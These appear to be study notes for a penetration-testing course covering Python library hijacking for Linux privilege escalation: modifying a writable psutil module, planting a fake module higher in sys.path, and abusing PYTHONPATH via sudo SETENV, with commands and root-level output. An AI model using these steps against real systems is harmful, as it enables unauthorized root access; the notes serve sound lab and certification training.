## 1. What Is Python Library Hijacking?

Python has a large collection of libraries/modules that programs import during execution. A library can be hijacked when an attacker can influence **which module gets loaded** or **modify the module that a privileged script imports**.

The module identifies **three main attack vectors**:

1. **Insecure Write Permissions**
    
2. **Python Library Search Path**
    
3. **`PYTHONPATH` Environment Variable**
    

---

# 2. Attack Vector #1 — Insecure Write Permissions

This is the simplest concept.

Suppose:

```text
Root Python script
      ↓
imports module
      ↓
Module is writable by attacker
      ↓
Modify module
      ↓
Injected code executes as root
```

The key condition is:

```text
Attacker can WRITE to imported module
            +
Python script runs with elevated privileges
            ↓
Library hijacking
```

The module specifically describes a scenario where the Python script can be run as `root` through `sudo`. Any code inserted into the writable module will then execute with those elevated privileges.

---

# 3. Start With `sudo -l`

Always check:

```bash
sudo -l
```

Example:

```text
User htb-student may run the following commands:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

This means:

```text
/usr/bin/python3
       ↓
/home/htb-student/mem_status.py
       ↓
Can execute as root
       ↓
No password required
```

The module uses this exact relationship to establish the privileged execution path.

---

# 4. Important SUID Detail

The script permissions are:

```text
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Notice:

```text
-rws
   ↑
 SUID
```

But **SUID on interpreted scripts such as Python/Bash scripts is ignored by Linux by default**.

Therefore:

```text
SUID on mem_status.py
        ↓
Does NOT give root execution
```

Instead, the module relies on:

```text
sudo privileges
```

to execute the Python script as root.

### CPTS takeaway

**Don't automatically assume `rws` on a script means SUID privilege escalation.**

---

# 5. Analyze the Python Script

Example:

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

The important line is:

```python
import psutil
```

and specifically:

```python
psutil.virtual_memory()
```

So our next question is:

> **Where is `psutil` located, and can we modify it?**

---

# 6. Find the Imported Function

The module searches for the function:

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

This reveals files containing:

```text
def virtual_memory():
```

including:

```text
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Now check its permissions:

```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Example:

```text
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 __init__.py
```

The important part is that the file is **writable**.

---

# 7. Why the Function Matters

The original module contains:

```python
def virtual_memory():

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()

    _TOTAL_PHYMEM = ret.total
    return ret
```

We can inject code at the beginning of the function.

For testing, the module uses:

```python
import os
os.system('id')
```

So the flow becomes:

```text
mem_status.py
      ↓
import psutil
      ↓
psutil.virtual_memory()
      ↓
Modified virtual_memory()
      ↓
os.system('id')
      ↓
Command executes as root
```

---

# 8. Execute Through Sudo

Run:

```bash
sudo /usr/bin/python3 ./mem_status.py
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

This proves:

```text
Writable psutil
       +
Python script executed through sudo
       ↓
Injected code executes as root
```

The module then notes that the test command can be replaced with a payload such as a reverse shell.

---

# 9. Attack Vector #2 — Python Library Search Path

Python searches specific directories when importing modules.

Check the search order with:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

Example:

```text
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

The **order matters**.

Python searches higher-priority paths before lower-priority ones.

---

# 10. Search Path Hijacking

The module gives two requirements:

### Requirement 1

The legitimate module must be located in a **lower-priority** search path.

### Requirement 2

The attacker must have **write permissions** to a **higher-priority** search path.

Then:

```text
Python search order:

HIGH priority
     ↓
/usr/lib/python3.8       ← attacker can write
     ↓
LOW priority
/usr/local/lib/python3.8/dist-packages
     ↓
Legitimate psutil
```

If the attacker creates:

```text
/usr/lib/python3.8/psutil.py
```

Python finds that file first.

```text
import psutil
     ↓
Search HIGH priority directory
     ↓
psutil.py found
     ↓
Import attacker-controlled module
```

This is **Python library search path hijacking**.

---

# 11. Find Where a Module Is Installed

The module uses:

```bash
pip3 show psutil
```

Example:

```text
Location: /usr/local/lib/python3.8/dist-packages
```

This tells us where the legitimate `psutil` installation lives.

Then compare that location against:

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

We're looking for:

```text
Legitimate module
        ↓
LOW priority directory

Attacker writable directory
        ↓
HIGH priority directory
```

---

# 12. Check Search-Path Permissions

Example:

```bash
ls -la /usr/lib/python3.8
```

Output includes:

```text
drwxr-xrwx 30 root root ...
```

The module identifies `/usr/lib/python3.8` as writable and higher priority than the directory containing the legitimate `psutil`.

---

# 13. Create a Fake Module

The attacker creates:

```text
psutil.py
```

with the same module name:

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

### Two things are critical

The malicious module must have:

1. The **same module name**
    
2. The required function with the **correct function signature/arguments**
    

Otherwise the target script will not work as expected.

---

# 14. Execute Search Path Hijack

Run:

```bash
sudo /usr/bin/python3 mem_status.py
```

The fake module is found first:

```text
Python
  ↓
Search sys.path
  ↓
/usr/lib/python3.8
  ↓
psutil.py ← attacker-controlled
  ↓
virtual_memory()
  ↓
id
  ↓
ROOT
```

The module demonstrates:

```text
uid=0(root) gid=0(root) groups=0(root)
```

followed by an `AttributeError`, because the fake `virtual_memory()` doesn't return the object expected by the rest of the script.

That error **does not mean the hijack failed**. The important result is that our code executed as root.

---

# 15. Attack Vector #3 — `PYTHONPATH`

`PYTHONPATH` is an environment variable that tells Python which directories to search for modules.

Conceptually:

```text
PYTHONPATH=/tmp
       ↓
Python searches /tmp
       ↓
Find imported module
       ↓
Load it
```

If an attacker can control `PYTHONPATH` while running a privileged Python process, they can redirect module searching to an attacker-controlled directory.

---

# 16. Find `SETENV` in Sudo

Check:

```bash
sudo -l
```

Example:

```text
User htb-student may run the following commands:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

The critical part:

```text
SETENV
```

This allows environment variables to be set for the sudo command.

---

# 17. `PYTHONPATH` Hijacking

The module uses:

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

Now Python is instructed to search:

```text
/tmp/
```

for modules.

If our malicious:

```text
/tmp/psutil.py
```

exists, Python can load it instead of the legitimate module.

```text
sudo
 │
 ↓
SETENV
 │
 ↓
PYTHONPATH=/tmp/
 │
 ↓
Python
 │
 ↓
Search /tmp first
 │
 ↓
Malicious psutil.py
 │
 ↓
Code executes as root
```

---

# 18. The Three Techniques Compared

|Technique|What attacker controls?|Key condition|
|---|---|---|
|**Insecure Write Permissions**|Existing imported module|Module is writable|
|**Library Search Path**|Higher-priority directory/module|Writable higher-priority path|
|**`PYTHONPATH`**|Python's search path|Can set environment variable|

### Visual comparison

```text
1. INSECURE WRITE
   Python
     ↓
   Existing module
     ↓
   MODIFY IT
     ↓
   ROOT


2. SEARCH PATH
   Python
     ↓
   Search order
     ↓
   Writable HIGH-priority directory
     ↓
   Fake module
     ↓
   ROOT


3. PYTHONPATH
   sudo SETENV
     ↓
   PYTHONPATH=/tmp
     ↓
   Fake module
     ↓
   ROOT
```

---

# 🔥 CPTS Enumeration Workflow

When you find a privileged Python script:

```text
                    sudo -l
                       │
                       ↓
             Can Python run as root?
                       │
                      YES
                       ↓
              Read the Python script
                       │
                       ↓
                 Find imports
                       │
              ┌────────┼────────┐
              ↓        ↓        ↓
          Writable   Search   PYTHONPATH
           module     path     control
              │        │        │
              ↓        ↓        ↓
           Modify   Hijack    Redirect
              │        │        │
              └────────┼────────┘
                       ↓
               Code executes as root
```

---

# 🚨 What to Look For During CPTS

When you see:

```bash
sudo -l
```

and find something like:

```text
NOPASSWD: /usr/bin/python3 <script>
```

**Immediately inspect the script's imports.**

For every import, ask:

```text
1. Where is this module located?
2. Who owns it?
3. Can I write to it?
4. What is Python's search order?
5. Can I write to a higher-priority directory?
6. Can I control PYTHONPATH?
7. Does sudo have SETENV?
```

---

# 🧠 Connection to Shared Object Hijacking

This is the same fundamental idea as the **Shared Object Hijacking** module you just completed.

### Shared objects

```text
SUID binary
     ↓
RUNPATH
     ↓
Writable library location
     ↓
Malicious .so
     ↓
ROOT
```

### Python

```text
Privileged Python
     ↓
Module search path
     ↓
Writable module/location
     ↓
Malicious Python module
     ↓
ROOT
```

The universal concept is:

> **A privileged program trusts a dependency that the attacker can control.**

---

# 🧠 Final CPTS Memory Map

```text
             PYTHON LIBRARY HIJACKING
                       │
          ┌────────────┼────────────┐
          ↓            ↓            ↓
      Writable      Search       PYTHONPATH
       Module        Path          Variable
          │            │            │
          ↓            ↓            ↓
       Modify      Higher-prio    Redirect
       existing      module        search
          │            │            │
          └────────────┼────────────┘
                       ↓
              Privileged Python
                       ↓
                  Code execution
                       ↓
                      ROOT
```

### 🔑 One-line memory trick

**`sudo Python → inspect imports → check module permissions → check sys.path → check PYTHONPATH/SETENV → hijack dependency → root`**.